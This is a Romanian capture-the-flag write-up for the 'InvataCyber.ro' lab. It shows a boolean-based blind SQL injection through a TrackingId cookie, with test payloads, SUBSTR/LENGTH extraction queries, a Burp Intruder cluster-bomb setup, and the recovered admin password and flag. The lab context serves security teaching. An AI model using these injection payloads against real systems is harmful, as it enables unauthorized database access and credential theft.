# Write-up: InvataCyber.ro - Blind SQL Injection
*[English version →](README.md)*

## Prezentarea provocării
Aplicația `InvataCyber.ro` utilizează un cookie `TrackingId` pentru a urmări sesiunile utilizatorilor. Când serverul recunoaște un identificator valid, returnează șirul de confirmare: `>> [OK] Valid tracking signature detected.`

Valoarea cookie-ului `TrackingId` este concatenată direct într-o interogare SQL internă, fără parametrizare sau sanitizare. Acest lucru introduce o vulnerabilitate de tip boolean-based blind SQL injection, permițând extragerea conținutului bazei de date (inclusiv a credențialelor de `administrator`) și autentificarea printr-o pagină de login ascunsă pentru obținerea flag-ului.

---

## Pasul 1: Interceptarea și confirmarea vulnerabilității
1. Deschide Burp Suite și capturează cererea `GET /`.
2. Identifică cookie-ul de urmărire din anteturile cererii:
   ```http
   Cookie: TrackingId=base-tracking-id-123
   ```
3. Trimite cererea către **Repeater** (`Ctrl+R` / `Cmd+R`).
4. Testează condiții booleene modificând valoarea cookie-ului:
   - **Condiție adevărată:** `TrackingId=base-tracking-id-123' AND '1'='1`  
     *Rezultat:* Returnează `>> [OK] Valid tracking signature detected.`
   - **Condiție falsă:** `TrackingId=base-tracking-id-123' AND '1'='2`  
     *Rezultat:* Returnează `>> [WARN] No valid tracking signature found.`

Diferența dintre răspunsuri confirmă că expresii SQL arbitrare pot fi evaluate prin intermediul cookie-ului.

---

## Pasul 2: Recunoaștere și formularea exploit-ului

### Identificarea numelui de utilizator
Tabelele și coloanele standard (cum ar fi `users`, `username`, `password`) pot fi verificate sau interogate din `sqlite_master`. Pentru a extrage primul nume de utilizator administrativ caracter cu caracter:

```sql
' AND (SELECT SUBSTR(username, 1, 1) FROM users LIMIT 1) = 'a' --
```

Iterarea prin pozițiile caracterelor extrage numele de utilizator: `administrator`.

### Determinarea lungimii parolei
Pentru a stabili lungimea parolei fără încercări manuale, testează secvențial folosind funcția `LENGTH()`:

```sql
' AND (SELECT LENGTH(password) FROM users WHERE username='administrator') < 1 --
' AND (SELECT LENGTH(password) FROM users WHERE username='administrator') < 2 --
```

Rularea acestei comparații în Burp Intruder arată că payload-ul este evaluat ca fiind adevărat la `< 13` și fals la `< 12`. Acest lucru confirmă că parola are o lungime de exact 12 caractere.

### Interogarea de extracție
Extrage fiecare caracter al parolei de 12 caractere folosind funcția `SUBSTR()` din SQLite:

```sql
' AND (SELECT SUBSTR(password, 1, 1) FROM users WHERE username='administrator') = 'a' --
```

---

## Pasul 3: Configurarea Burp Intruder
1. Fă clic dreapta pe cererea de bază din Repeater și selectează **Send to Intruder** (`Ctrl+I` / `Cmd+I`).
2. Deschide fila **Positions**.
3. Setează tipul de atac la **Cluster Bomb** pentru a itera simultan prin poziții și seturi de caractere.
4. Șterge pozițiile implicite și plasează marcaje de payload în jurul indexului caracterului (`1`) și al caracterului de testat (`a`):
   ```text
   Cookie: TrackingId=base-tracking-id-123'%20AND%20(SELECT%20SUBSTR(password,%20§1§,%201)%20FROM%20users%20WHERE%20username='administrator')%20=%20'§a§'%20--
   ```

---

## Pasul 4: Configurarea payload-urilor
Deschide fila **Payloads**.

**Payload Set 1 (Index):**
- **Payload type:** Numbers
- **From:** 1
- **To:** 12
- **Step:** 1

**Payload Set 2 (Caracter):**
- **Payload type:** Simple list
- **Items:** `a-z` și `0-9` (set alfanumeric cu litere mici)

---

## Pasul 5: Configurarea Grep-Match
1. Deschide fila **Settings** din Intruder.
2. În secțiunea **Grep - Match**, șterge valorile implicite.
3. Adaugă șirul: `[OK] Valid tracking signature`.

---

## Pasul 6: Rularea atacului
1. Fă clic pe **Start Attack**.
2. Sortează rezultatele după coloana `[OK] Valid tracking signature` pentru a izola răspunsurile pozitive.
3. Ordonează intrările găsite după Payload 1 (indicii 1 - 12) pentru a asambla parola completă: `a1b2c3d4e5f6`.

---

## Pasul 7: Obținerea flag-ului
1. Enumerează endpoint-urile ascunse folosind un utilitar de brute-force (`gobuster` sau `dirb`) pentru a identifica ruta de autentificare la `/login`.
2. Navighează la `/login` pentru a accesa consola **Administrator Override Console**.
3. Introdu `administrator` ca nume de utilizator și `a1b2c3d4e5f6` ca parolă.
4. Fă clic pe **Initialize Override**.
5. Aplicația validează accesul și afișează flag-ul: `InvataCyber{blind_sql}`.